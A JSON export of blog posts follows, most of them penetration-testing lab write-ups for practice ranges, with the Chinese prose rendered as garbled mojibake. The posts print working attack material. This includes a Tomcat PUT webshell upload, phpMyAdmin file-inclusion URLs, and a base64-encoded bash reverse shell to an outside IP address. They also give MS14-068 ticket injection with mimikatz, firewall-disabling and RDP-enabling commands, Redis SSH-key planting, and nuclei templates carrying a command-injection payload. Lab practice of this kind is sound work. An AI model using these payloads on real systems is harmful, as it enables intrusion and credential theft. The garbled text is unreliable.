JWTï¼Œå·¥å…·å¯ä»¥æ¨¡æ‹Ÿæ•´ä¸ªç­¾åéªŒè¯çš„è¿‡ç¨‹ï¼Œæ›´å‡†ç¡®åœ°åˆ¤æ–­æ‰¾åˆ°çš„å¯†é’¥æ˜¯å¦æ˜¯æ­£ç¡®çš„ç­¾åå¯†é’¥ ã€‚ æ‹¿åˆ°å¯†é’¥æ˜¯secret1å¯ä»¥ç›´æ¥åˆ°å®˜ç½‘è¾“å…¥å¯†é’¥ä¿®æ”¹äº† ä½†æ˜¯å‰é¢ä¸¤ä¸ªå®éªŒæ˜¯ä¸å¯ä»¥ç›´æ¥ä¿®æ”¹çš„å¿…é¡»ä½¿ç”¨å·¥å…·https://www.jwt.io/ å‘åŒ…éªŒè¯æˆåŠŸåˆ é™¤å³å¯é€šè¿‡","tags":["jwt"]},{"title":"çº¢æ—¥é¶åœº4","path":"/2025/08/08/posts/red4/","content":"çº¢æ—¥é¶åœº4â€” ä¸€å…±ä¸‰å°ä¸»æœº ä¸€å°åŒç½‘å¡1å…¬ç½‘å’Œå†…ç½‘ç½‘æ®µ è¿˜æœ‰ä¸¤å°ä¸€å°DC ä¸€å°WIN7 å†…ç½‘ç½‘æ®µä¸º183 Getshellå‘ç°å…¬ç½‘å¼€äº†3ä¸ªå¥‡æ€ªç«¯å£æˆ‘ä»¬è®¿é—® 2001ç«¯å£getshell2001ä¸€çœ‹å°±æ˜¯Struct2 ç›´æ¥å·¥å…·getshell ç¬¬ä¸€ä¸ªâ€”â€”â€”2001 ä¸Šä¼ JSPå“¥æ–¯æ‹‰getshell 2002ç«¯å£æ²¡æœ‰ç®¡ç†ç•Œé¢ https://www.exploit-db.com/exploits/42953 tomcat PUT CVEPUT /1.jsp/ HTTP/1.1Host: 192.168.3.103:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://192.168.3.103:8080/examples/Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4,zh-TW;q=0.2Cookie: JSESSIONID=A27674F21B3308B4D893205FD2E2BF94Connection: closeContent-Length: 26 % out.println(hello);% è¿™é‡Œæˆ‘ä»¬å†™å…¥å“¥æ–¯æ‹‰çš„shellè¿æ¥ 2003ç«¯å£ é‡Œé¢å³ä¸‹è§’æœ‰adminç‰ˆæœ¬4.8.1 POCåˆ©ç”¨ phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ åˆ©ç”¨http://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../etc/passwdæˆ‘ä»¬å¯ä»¥åŒ…å«æ‰§è¡Œ SELECT ?php phpinfo();? æ—¶ï¼ŒPHP ä¼šæŠŠæŸ¥è¯¢ç»“æœï¼ˆå³å­—ç¬¦ä¸² ?php phpinfo();? ï¼‰é€šè¿‡ Session æœºåˆ¶å­˜å‚¨ï¼ˆæ¯”å¦‚å†™å…¥ $_SESSION æˆ–ç›´æ¥è½åœ°åˆ° Session æ–‡ä»¶ï¼‰ã€‚---Session çš„æœ¬è´¨æ˜¯ â€œæœåŠ¡å™¨å­˜å‚¨ç”¨æˆ·æ•°æ®çš„å®¹å™¨â€ï¼Œå¹¶éåªèƒ½å­˜ â€œç™»å½•ä¿¡æ¯â€ ã€‚-- select ?php phpinfo();? è¿™ä¸ªsessionæ—§ç‰ˆæœ¬ï¼šsess_ + session_idæ–°ç‰ˆæœ¬ï¼šå¯èƒ½ç›´æ¥ç”¨ session_idï¼Œä½†å†å²åœºæ™¯ä¸­å¤§é‡å­˜åœ¨ sess_ å‰ç¼€çš„ä¹ æƒ¯ã€‚é€šå¸¸åœ¨/tmphttp://192.168.1.188:2003/index.php?target=db_datadict.php%253f/../../../../../../tmp/sess_6dd19ff2088d22ac4b1bfb67db1a68a5select ?php system(base64_decode(YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMzIuNjQvODA4MCAwPiYxIg==)) ? åå¼¹ çœ‹ä¸‹session åå¼¹shell dockerææƒtomcatshellé‡Œé¢å‘ç°äº†æ˜¯åœ¨dockerç¯å¢ƒ å¹¶ä¸”æ˜¯ç‰¹æƒ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æŒ‚è½½é€ƒé€¸æŠŠ/dev/sda1 æŒ‚è½½è¿‡å» å»ºç«‹æ–‡ä»¶å¤¹ nikoä¸‹é¢å†™å…¥å…¬é’¥åˆ°rooté‡Œé¢ç™»å½•è¯•è¯•è¿™é‡Œä»…ä»…é™åˆ¶tomcat dockerææƒ å…¶ä½™ä¸¤ä¸ªshellæ²¡æ‰¾åˆ°ææƒæ–¹æ³• è¿™é‡Œæˆ‘ä¹Ÿè¯•äº†å®šæ—¶ä»»åŠ¡ä½†æ˜¯å°±æ˜¯ä¸è¡Œ å¹¶ä¸”å¯ä»¥çœ‹åˆ°ç¡®å®šæ˜¯å†™å…¥è¿›å»äº†çš„ æœ€åè¿˜æ˜¯å¯†é’¥ç™»å½•æ‹¿åˆ°webå…¨éƒ¨æƒé™ å†…ç½‘æ¸—é€å¯åŠ¨æˆ‘ä»¬çš„CSä¸Šçº¿ä¸‹ç¬¬ä¸€å°linux shell è¿™é‡Œç”¨æ’ä»¶linuxä¸Šçº¿genCrossC2.Linux ip tcp ./.cobaltstrike.beacon_keys null Linux x64 3.out ç”Ÿæˆå¼€ä¸€ä¸ªpython3 å¯¹é¢ç”¨wgetä¸‹è½½æ‰§è¡Œä¸Šçº¿ æˆåŠŸä¸Šçº¿web å‘ç°å¦å¤–ä¸€å¼ ç½‘å¡183 æˆ‘ä»¬å¯ä»¥æ‰«æä¸‹ fsCANæ‰«æç»“æœ è¿™é‡Œæˆ‘ç”¨CSå»ºç«‹linuxéš§é“æ²¡æœ‰æˆåŠŸæ¢ä¸€ä¸ªC2å·¥å…· æœ¬åœ°å¯ä»¥è®¿é—®å†…ç½‘äº†ä½¿ç”¨ms17010æ‰«æ ç„¶åç”¨msfconsleä»£ç†ä¸‹socksæ‰«æ use auxiliary/scanner/smb/smb_ms17_010set rhost 192.168.183.129setg Proxies socks5:116.62.32.64:36666 æ‹¿ä¸‹äº†win7 ä½¿ç”¨mimikatzæŠ“å–å¯†ç å¼€å¯3389ç™»å½•ä¸Šå» ç„¶åä½¿ç”¨MS14-068 æ³¨å…¥ä½†æ˜¯æˆ‘è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€ç›´ä¸æˆåŠŸå‘½ä»¤å¦‚ä¸‹ç”Ÿæˆåæ³¨å…¥è¿›å»è¿™é‡Œä¿®æ”¹ç®¡ç†å‘˜å¯†ç net user administrator Admin12345 net user administrator Admin12345 /active:yes åæ¿€æ´»rdpREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f æ‰“å¼€3389 ç™»å½•ä½¿ç”¨ms14-068 cd \\Users\\douser\\DesktopMS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123mimikatz.exekerberos::purge æ¸…ç©ºkerberos::listkerberos::ptc TGT_douser@DEMO.com.ccachedir \\\\WIN-ENS2VR5TR3N\\C$ç„¶åå¯ä»¥è®¿é—®DC Cç›˜æˆ‘è¿™é‡Œèƒ½æ˜¯å»ºç«‹äº†è¿æ¥net use å¦‚æœä½ æˆåŠŸäº†æ³¨å…¥äº†å¯ä»¥ç›´æ¥æ‰§è¡Œ ä¸‹ä¸€æ­¥å°±æ˜¯æœ‰äº†æœ€é«˜æƒé™å°±æ˜¯å…³é—­é˜²ç«å¢™è¿™æ—¶å€™èƒ½ç”¨ms17010æ‰“DCäº†","tags":["docker"]},{"title":"Wechatæ¸—é€ç›¸å…³æŠ“åŒ…åç¼–è¯‘","path":"/2025/08/08/posts/wechat/","content":"Wechatæ¸—é€ç›¸å…³æŠ“åŒ…åç¼–è¯‘ e0e1åç¼–è¯‘å·¥å…·éœ€è¦é…ç½®æ–‡ä»¶ç›®å½•config.yamlé‡Œé¢ wx-file: â€˜C:\\Users\\user\\Documents\\WeChat Filesâ€™ é…ç½®ä½ çš„ç›®å½• è‡ªåŠ¨æ”¶é›†æ¥å£è¿™ä¸ªå·¥å…·æ›´åå‘ä¿¡æ¯æ”¶é›† ç”Ÿæˆå¯¹åº”çš„æ–‡ä»¶xlsx Wedecodeåç¼–è¯‘å·¥å…·wedecodeç¨‹åºå¯ä»¥å®ç°å…¨é¢åç¼–è¯‘å¯¹æ¯”e0e1ä½†æ˜¯e0e1æ˜¯è‡ªåŠ¨åŒ–å®ç° ä½†æ˜¯æ¨èä¸¤ä¸ªä¸€èµ·ç”¨ å½“ä½ å¾®ä¿¡å°ç¨‹åºè®¿é—®ç‚¹å‡»ä¸€ä¸ªè¿›å»åä¼šç”Ÿæˆä¸€ä¸ªæ–‡ä»¶å¤¹ wxå¼€å¤´çš„å°±å¯ä»¥ä½¿ç”¨å·¥å…·è¿›è¡Œåç¼–è¯‘äº†è¿™é‡Œæ³¨æ„å¾®ä¿¡ç‰ˆæœ¬å¤ªé«˜å¥½åƒä¸èƒ½åç¼–è¯‘äº†æ²¡æœ‰wxapkgåç¼€äº† ä½†æ˜¯ä½ æ”¾å…¥è¿›å»å®ƒæç¤ºé”™è¯¯-å…ˆè§£å¯†æ‰è¡Œ ä½¿ç”¨ç›®å½•ä¸‹çš„è§£å¯†å·¥å…· æ‰“å¼€é€‰ä¸­__APP__.wxapkg ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ç„¶åå†å»æ”¾åˆ°wedecodeé‡Œé¢ ç„¶ååç¼–è¯‘ å¾®ä¿¡å°ç¨‹åºåœ¨çº¿è°ƒè¯•è¿™é‡Œè¦æ³¨æ„ç‰ˆæœ¬çš„ ä»»åŠ¡ç®¡ç†å™¨å³é”®æ‰“å¼€ç›®å½•æŸ¥çœ‹å°ç¨‹åºç‰ˆæœ¬ JaveleyQAQWeChatOpenDevTools-Python: WeChatOpenDevTool å¾®ä¿¡å°ç¨‹åºå¼ºåˆ¶å¼€å¯å¼€å‘è€…å·¥å…· https://github.com/tom-snow/wechat-windows-versions/releases/download/v3.9.10.19/WeChatSetup-3.9.10.19.exe æ¨èè¿™ä¸ªç‰ˆæœ¬ WechatOpenDevTools-Python.exe ç°åœ¨æ²¡æœ‰æˆ‘ä»¬æ¥å¼€å¯å®ƒ å…ˆå…³é—­æ‰€ä»¥å°ç¨‹åº BPæŠ“åŒ…å°ç¨‹åºProxifierå·¥å…· wechatappex.exeåŠ åˆ°ç¨‹åºé‡Œé¢ æˆåŠŸæŠ“åŒ…","tags":["wedocode","wechat"]},{"title":"XuanJié¶æœº---éš¾åº¦lowçŸ¥è¯†ç‚¹-Git,TOTP","path":"/2025/08/08/posts/xuanji/","content":"XuanJié¶æœºâ€”éš¾åº¦lowçŸ¥è¯†ç‚¹-Git,TOTP,soææƒ Nmapæ‰«æå‘ç°ç«¯å£å¼€æ”¾å¸¸è§„çš„ç«¯å£ ç»“æœæ˜¯ä¸€ä¸ªéªŒè¯ç ä»¤ç‰Œ Dirsearchå‘ç°Gitæ³„éœ²ç”¨å·¥å…·æå– è¿™ä¸ªå·¥å…·æ˜¯PYTHON2 git log -pæ‰¾å‡ºä¸åŒç‚¹å‘ç°ä¸€ä¸ªæ³¨é‡Š æ”¾åœ¨ç”Ÿæˆå™¨ç½‘ç«™base32 éƒ½å¯ä»¥ TOTP ç”Ÿæˆå™¨ åœ¨çº¿OTPå¯†ç ç”Ÿæˆå™¨ æ‹¿åˆ°shellæƒé™åå¼¹å°±è¡Œ linpeasæ‰«æå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶å¯å†™ AIè¯´å¯ä»¥åŠ¨æ€åº“æå–ææƒ æ‹¿rootå†™ä¸€ä¸ªCæ–‡ä»¶ ç”Ÿæˆä¸ºåŠ¨æ€åº“soæ–‡ä»¶ -fPICï¼šç”Ÿæˆä½ç½®æ— å…³ä»£ç ï¼ˆå…±äº«åº“å¿…éœ€ï¼‰ã€‚ -sharedï¼šæŒ‡å®šç”Ÿæˆå…±äº«åº“ã€‚ è¾“å…¥åæ‰§è¡Œrootä»–ä¼šè°ƒç”¨ç„¶åè·å¾—rootæƒé™ ä½†æ˜¯è¿™é‡Œæœ‰é—®é¢˜å†æŠŠæƒ…å†µè¿”å›è¯•è¯• å¯ä»¥æ‰§è¡Œå‘½ä»¤ æ€»ç»“ä¸€ä¸‹","tags":["TOTP","Git"]},{"title":"nuclei-POCç¼–å†™","path":"/2025/08/06/posts/nuclei-poc/","content":"nuclei-POCç¼–å†™ CVEä»‹ç»https://docs.nuclei.sh/template-guide/introductionhttps://blog.csdn.net/qq_41315957/article/details/126594572https://blog.csdn.net/qq_41315957/article/details/126594670 vulhub-å¯åŠ¨CVE-2023-28432 https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md é›†ç¾¤å¯åŠ¨åï¼Œè®¿é—®http://your-ip:9001å¯ä»¥æŸ¥çœ‹Webç®¡ç†é¡µé¢ï¼Œè®¿é—®http://your-ip:9000æ˜¯APIæœåŠ¡ã€‚ æ­£å¸¸POC POST /minio/bootstrap/v1/verify HTTP/1.1Host: your-ip:9000Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36Connection: closeCache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 0ä¼šå¾—åˆ°ä¸¤ä¸ªkeyæ”¾å…¥å³å¯åˆ©ç”¨ ä¸‹è½½å®Œå¼€å¯æ˜¯è‡ªåŠ¨å¼€å¯çš„æœåŠ¡ï¼Œä½ ä¸ä½¿ç”¨å¯ä»¥æ‰‹åŠ¨æ§åˆ¶å…³é—­ æ‰‹åŠ¨ç¼–å†™httppoccopyä¸€ä¸ªå®˜æ–¹çš„æŒ‰ç…§æ ¼å¼è¿›è¡Œä¿®æ”¹è¿™é‡Œä¿®æ”¹ä¸‹id æ³¨æ„è¿™ä¸ªserverityç­‰çº§ä¸è¦ä¹±æ”¹ æ”¹äº†ä¼šæŠ¥é”™å°±medium high ç­‰å›ºå®šæ ¼å¼çš„è¿›è¡Œä¿®æ”¹ nuclei.exe -t mini.yaml -validate id: CVE-2023-28432-minioinfo: name: starrui777 author: starrui777 severity: high tags: cnvd,cnvd2017,emobile,ognl,fanweihttp: - raw: - | POST /minio/bootstrap/v1/verify HTTP/1.1 Host: Hostname Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36 Connection: close Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 0 matchers: - type: word part: body words: - MINIO_ROOT_PASSWORD - MINIO_ROOT_USER condition: and åŸºç¡€è§£é‡Šï¼š http: è¡¨ç¤ºhttpè¯·æ±‚ Hostname è¡¨ç¤ºè·å–ä½ è¾“å…¥çš„IPåŠ ç«¯å£ raw æ ¼å¼:å®Œå…¨æ¨¡æ‹ŸçœŸå®çš„ HTTP æŠ¥æ–‡ï¼ŒNuclei ä¼šåŸæ ·å‘é€è¯·æ±‚ï¼Œé¿å…äº†å›  YAML è¯­æ³•è½¬æ¢å¯èƒ½å¯¼è‡´çš„æ ¼å¼é—®é¢˜ï¼ˆæ¯”å¦‚ headers ç¼©è¿›ã€ç‰¹æ®Šå­—ç¬¦å¤„ç†ç­‰ï¼‰ã€‚ matchers: è¡¨ç¤ºåŒ¹é… word:è¿”å›è¯ åŒ…å«ä¸¤ä¸ª condition andè¡¨ç¤ºä¸¤ä¸ªéƒ½æœ‰è¡¨ç¤ºæ¼æ´éªŒè¯æˆåŠŸå¦åˆ™å¤±è´¥ è¿˜æœ‰å¾ˆå¤šè§é“¾æ¥ è¿™ç§ä»€ä¹ˆç¼©è¿›å•Šå•è¯å•Šé”™è¯¯ä¸€ä¸ªå°±è¯†åˆ«ä¸äº†å¯ä»¥ä½¿ç”¨validataè¯†åˆ«æˆ–è€…AIé—®ä¸‹ä½†æ˜¯AIå¤§æ¦‚ç‡ä¸è¡Œ æ‰‹åŠ¨ç¼–å†™-DNSLOGPOCé¦–å…ˆDNSlogåœ°å€å¯é•¿å¯çŸ­Content-Length: 165 è¿™é‡Œå°±æ˜¯ç¡®å®šä¸äº†æ•°æ®åŒ… ä½ å¯ä»¥æŠŠâ€‹ Connection: closeâ€‹ Content-Length: 165åˆ é™¤ å¯èƒ½åˆ é™¤ Content-Lengthï¼ŒæœåŠ¡å™¨å¯èƒ½æ— æ³•æ­£ç¡®åˆ¤æ–­è¯·æ±‚ä½“çš„ç»“æŸä½ç½®å®ƒè‡ªå¸¦æœ‰dnsä¸è¦ç›´æ¥æ”¾å» pocid: CVE-2022-30525info: name: starrui777 author: starrui777 severity: high tags: cnvd,cnvd2017,emobile,ognl,fanweihttp: - raw: - | POST /ztp/cgi-bin/handler HTTP/1.1 Host: Hostname User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Content-Type: application/json Connection: close Content-Length: 165 command: setWanPortSt,proto: dhcp,port: 1270,vlan_tagged: 1270,vlanid: 1270,mtu: payload1,data: payloads: payload1: - ; ping -c 3 interactsh-url; matchers: - type: word part: interactsh_protocol name: dns words: - dns è¿™é‡Œæˆ‘ç”¨nuclei 2ç‰ˆæœ¬å¯ä»¥ç”¨nuclei3ä¸è¡Œå¯èƒ½è¯­æ³•æœ‰å˜åŠ¨ BPæ’ä»¶ç›´æ¥ç”Ÿæˆnuclei-burp-plugin-1.1.3 å¸¸è§„çš„HTTPç¼–å†™ dnsçš„ä¸è¡Œ æŠ“åŒ…è®°å¾—ä¿®æ”¹ç«¯å£ é€‰æ‹©å“åº”åŒ¹é…è¯å‘é€åˆ°æ’ä»¶ å¯ä»¥æ’ä»¶é‡Œé¢æ‰§è¡Œä¹Ÿå¯ä»¥ä¿å­˜ä¸‹æ¥ è‡ªå·±éªŒè¯","tags":["nuclei"]},{"title":"è‡ªåŠ¨åŒ–æ¼æ´æ‰«æå·¥å…·","path":"/2025/08/04/posts/scan/","content":"è‡ªåŠ¨åŒ–æ¼æ´æ‰«æå·¥å…·-AVWS-POCç®¡ç†å·¥å…·-Nuclei-Tscanplus-Yscan AVWSä¸‹è½½å®Œå¼€å¯æ˜¯è‡ªåŠ¨å¼€å¯çš„æœåŠ¡ï¼Œä½ ä¸ä½¿ç”¨å¯ä»¥æ‰‹åŠ¨æ§åˆ¶å…³é—­ ç™»å½•åé€‰æ‹©Targetæ·»åŠ ç½‘å€ è¿›å…¥åé»˜è®¤é€‰æ‹©æ‰«æå…¨éƒ¨æ¼æ´æ­£å¸¸æ‰«æ å¦‚æœä½ æƒ³BPçœ‹æˆ–è€…BPè‡ªåŠ¨æ‰«æå¯ä»¥è½¬å‘æ•°æ®åŒ…åˆ°BPè”åˆ é€‰æ‹©æ‰«æé»˜è®¤é€‰æ‹© ç‚¹è¿›å»æŸ¥çœ‹ä¿¡æ¯ é€‰æ‹©æ‰«æçš„æ¼æ´ææƒå‘é€åŒ…å¤åˆ¶å‘é€éªŒè¯ Tscanplus-é›†æˆå·¥å…·è¿™ä¸ªå·¥å…·éœ€è¦VIPçœ‹æƒ…å†µä½¿ç”¨-é™„å¸¦æŒ‡çº¹æ¢æµ‹ç«¯å£æ‰«æç­‰åŠŸèƒ½ é™„å¸¦æŒ‡çº¹è¯†åˆ«å¾ˆå¥½ç”¨ Yscan-é›†æˆå·¥å…·æ²¡æœ‰ä¸Šé¢çš„VIPä½†æ˜¯åŠŸèƒ½å°‘ç‚¹ Nuclei-POCæ¼æ´æµ‹è¯•å·¥å…·projectdiscoverynuclei-templates: Community curated list of templates for the nuclei engine to find security vulnerabilities. å®˜æ–¹åº“ https://github.com/ExpLangcn/NucleiTPhttps://github.com/wooluo/nuclei-templates-2025hw nuclei.exe -hå¸®åŠ© -upæ›´æ–° -té€‰æ‹©æ¨¡æ¿ä¸é€‰é»˜è®¤ -target ç›®æ ‡ç½‘å€ Yakityakitä¸ä»…å¯ä»¥æ§åˆ¶å‘åŒ…ä¹Ÿå¯ä»¥æ‰«ææ¼æ´ å…¨è‡ªåŠ¨å·¥å…·GOBYä½†æ˜¯å› ä¸ºçº¢é˜Ÿç‰ˆPOCå°‘ ä½¿ç”¨éœ€è¦ä»˜è´¹ æ‰«æé»˜è®¤æ‰«æç«¯å£å’ŒPOC åªéœ€è¦IP","tags":["AVWS"]},{"title":"APPè„±å£³","path":"/2025/08/02/posts/APP3/","content":"APP-è„±å£³ è¦ç”¨åˆ°frida pip install fridapip install frida-toolspip install frida-dexdump è„±å£³fridaæ¨¡æ‹Ÿå™¨ç‰ˆæœ¬è¦å’Œæœ¬åœ°çš„ä¸€è‡´è½¬å‘å¹¶å¯åŠ¨Fridaadb forward tcp:27042 tcp:27042è¿æ¥åˆ¤æ–­ï¼šfrida-ps -U frida-ps -R ç¡®å®šä¸Šä¼ çš„å’Œæœ¬åœ°çš„ä¸€è‡´ å‘ç°å¯ä»¥åŒæ­¥æŸ¥çœ‹è¯æ˜æ— è¯¯ è·å–ä¸‹APPåŒ…åå­—å‘ç°æœ‰åŠ å›º åœ¨æ¨¡æ‹Ÿå™¨ä¸­å…ˆå¯åŠ¨APPç„¶åè¾“å…¥å‘½ä»¤è·å–classæ–‡ä»¶ å‹ç¼©åä¸Šä¼ åˆ°æ¨¡æ‹Ÿå™¨ä¸­ è§£å‹ç¼© å…¨é€‰DEXä¿®å¤ ä¿®å¤åæ”¾åˆ°å‹ç¼©åŒ…é‡Œé¢å‘åˆ°ä¸»æœº è§£å‹æ”¾å…¥jadxåç¼–è¯‘APPè½¯ä»¶ å‘ç°å¯ä»¥æœç´¢äº†ï¼Œæ²¡æœ‰è„±å£³å…¨æ˜¯propå¼€å¤´è¿™ç§åç¼€","tags":["CS"]},{"title":"çº¢æ—¥é¶åœº1-CSå†…ç½‘æ¸—é€","path":"/2025/07/31/posts/Red1/","content":"çº¢æ—¥é¶åœº1-CSå†…ç½‘æ¸—é€ æ¶æ„IPï¼š æ”»å‡»è€…ä¸º1ç½‘æ®µ webæœåŠ¡å™¨ï¼š1å’Œ52ç½‘æ®µ å…¶ä½™æˆå‘˜çš†åªæœ‰1ç½‘æ®µ ä½¿ç”¨å·¥å…·å¯†ç å¯èƒ½ä¸åŒå› ä¸ºè¿›å»è¿™äº›æœåŠ¡å™¨å°±è®©ä½ æ”¹å¯†ç ä½ å¯ä»¥ä¿®æ”¹åæ”¹å›æ¥ ä½¿ç”¨å·¥å…·ï¼š CS4.7 å“¥æ–¯æ‹‰ impacket-0.11.0å¥—ä»¶ å¼€å§‹æ¸—é€ç¬¬ä¸€å°ä¸»æœºè¿™é‡Œshellæœ‰ä¸¤ç§è¿˜æœ‰ä¸€ç§æ˜¯ç½‘ç«™çš„è¿˜æœ‰ä¸€ç§æ˜¯ä¸‹é¢è¿™ç§æ•°æ®åº“ diræ‰«æå‘ç°å¼€äº†phpadminç™»å½•çœ‹çœ‹ å¼±å£ä»¤è¿›å» root:root https://www.cnblogs.com/hellobao/articles/17253635.html phpadminæå–æ–¹æ³•æˆ‘é€‰æ‹©ä¸‹é¢è¿™ç§ MySQL æœ¬èº«å…·å¤‡çš„ç‰¹æ€§é€šè¿‡æ—¥å¿—æ–‡ä»¶å†™ shellSHOW VARIABLES LIKE general%;set global general_log = ON;set global general_log_file=C:\\\\phpstudy\\\\www\\\\\\\\star.phpå› ä¸ºä»–è¿™æ˜¯phpstudyæ‰€ä»¥å†™å…¥æ—¥å¿—åˆ°star.php æ‰“å¼€åŠŸèƒ½ å‘½ä»¤æ‰§è¡Œæ— è¯¯ ç¡®å®å¯ä»¥è®¿é—® å†™å…¥åˆ°æ—¥å¿— å“¥æ–¯æ‹‰è¿æ¥ å¼¹åˆ°æˆ‘ä»¬çš„CSå·¥å…·ä¸Š æ‰«æç«¯å£ç½‘æ®µ è‡ªåŠ¨æ”¾å…¥åˆ°å¯†ç å’Œç›®æ ‡é‡Œé¢ æ‰¾åˆ°CDä¸»æœº ç¬¬äºŒå°ä¸»æœºå› ä¸ºå‰é¢ä¿¡æ¯æ”¶é›†åˆ°éƒ½å¼€æ”¾äº†445 æˆ‘ä»¬å°è¯•ä¸‹æ°¸æ’ä¹‹è“å’Œwmi ä¸è¡Œå•Šä¸¤å°éƒ½ ä½¿ç”¨å¥—ä»¶é‡Œé¢çš„wmiæˆåŠŸæ‹¿ä¸‹DC python wmiexec.py Administrator:hongrisec@2025@192.168.52.138 -codec gbk è¿™é‡Œæˆ‘è¯•äº†åå¼¹ä½†æ˜¯å°±æ˜¯ä¸è¡Œæ­£å‘éƒ½ä¸è¡Œ æœ€åå…³é—­é˜²ç«å¢™å¯ä»¥è¿æ¥ #å…³é—­é˜²ç«å¢™netsh firewall set opmode disable #winsows server 2003 ä¹‹å‰netsh advfirewall set allprofiles state off #winsows server 2003 ä¹‹å#æ³¨å†Œè¡¨å¼€å¯3389ç«¯å£REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f#æ·»åŠ é˜²ç«å¢™è§„åˆ™netsh advfirewall firewall add rule name=Open 3389 dir=in action=allow protocol=TCP localport=3389 ç¬¬ä¸‰å°ä¸»æœºåœ¨å¯†ç å‡­è¯é‚£é‡Œ åé¢æˆ‘ä»¬æ¨ªå‘è¿æ¥å¯†ç å–·å°„ä¸Šåˆ°ç¬¬3å° ä¸‰å°å…¨éƒ¨æ‹¿ä¸‹","tags":["CS"]},{"title":"çº¢æ—¥é¶åœº7-WP-MS17-010-WMI-laravel-docker-exp","path":"/2025/07/29/posts/Red7/","content":"çº¢æ—¥é¶åœº7-WP-MS17-010-WMI-laravel-docker-exp æ¶æ„å¦‚ä¸‹è®°å¾—å…³é—­win7é˜²ç«å¢™ å·¥å…· fscan CVE-2021-3129.py redis-cli or Another Redis Desktop Manager C2å¹³å°ç”¨äºsocksä»£ç† linuxå†…æ ¸ææƒCè„šæœ¬ CVE-2021-3493exploit.c at main Â· brisketsCVE-2021-3493 Proxifierä»£ç† mimikatz å¯†ç  impacket-0.11.0-wmiexec å·¥å…· æ–¹ç¨‹å¼å·¥å…·åŒ…å›¾å½¢ç•Œé¢ç‰ˆV0.42 ç¬¬ä¸€å°ä¸»æœºä½¿ç”¨FSCANæ‰«ææ˜¯laravelæ¡†æ¶ä½¿ç”¨CVE æ‹¿ä¸‹ä¸€ä¸ªåé—¨ åŒæ—¶ä»–è¿™é‡Œæ‰«æè¿˜æœ‰ä¸€ä¸ªredisæˆ‘ä»¬è¯•è¯•æœªæˆæƒå‘ç°å¯ä»¥å†™å…¥æˆ‘ä»¬çš„å…¬é’¥è¿›å» ç›´æ¥SSHè®¿é—®æ‹¿ä¸‹ç¬¬ä¸€å°ä¸»æœºshell è¿™é‡Œset read-only noæ˜¯è®©ä»–å¯å†™ config set dir /root/.ssh/config set dbfilename authorized_keys# ä¿å­˜keyçš„æ—¶å€™åŠ ä¸Šä¸¤ä¸ª` `æ˜¯ä¸ºäº†é¿å…å’ŒRedisé‡Œå…¶ä»–ç¼“å­˜æ•°æ®æ··åˆconfig set slave-read-only noset key ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChJ31EeTjZIw5tz/8b2Ma6XyrjI6+FSUfbnWRF7HA6/pMtgTbZGPhKXRzdigHq2NY40KSz7xpeDvpZEbdCjpCiimXfwgALaZpI/GxftyA4C9yWoSQxR7jdK8dWAurA9rnoPnwrOO8F14rg2P2vknrtR70eIklAwbuDvJ8Aq9Ai5tMPaiOx2uJAYRWYRgOd/jP4WhZ8nF88N+E963xFf/Bf37AMV4SVujvasubsmM96t7fOqEBgzyK+xTClVqhzzGKhcr5AfYDvemDnffXEC3Ff+cdkXpW8HhX8FrK6D2HzwpOIN/8hypJNkGssXOZ9E4rTWWoY84VtPvceYMUI7xV44VskmZMLYrBAxfPDzEJV/HHKX1xQXwsHg7WiSRntApPS3BfeMr8ZqJTSBqoTVAnoMAuClPy1Vm1c+mlzvjlCbBBLfLEWNvuslzR9rQMFpMwLN3PoBhyGZ5+gv94QPbicLhNuLdU10KD5dHLtWUoWIGOu2RqtcjjKul+fT62BPy8= root@kali save ç™»å½•æˆåŠŸ å¯ä»¥çœ‹å®ƒä½¿ç”¨äº†nginxä»£ç†äº†å†…ç½‘çš„52.20çš„8000ç«¯å£ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç«¯å£æœ‰è¿™ä¸ªæœåŠ¡ æˆ‘ä»¬æŠŠä¸Šé¢é‚£ä¸ªshellå¼¹è¿‡æ¥å› ä¸ºæ˜¯å†…ç½‘å¯ä»¥å¼¹ å¯ä»¥å‘ç°æˆ‘ä»¬æ˜¯åœ¨dockerä¸­ è¿™é‡Œrootæœ‰ä¸€ä¸ªæƒé™ ç»å…¸ç¯å¢ƒå˜é‡åŠ«æŒææƒ ç¬¬äºŒå°ä¸»æœºæŒ‚è½½é€ƒé€¸ 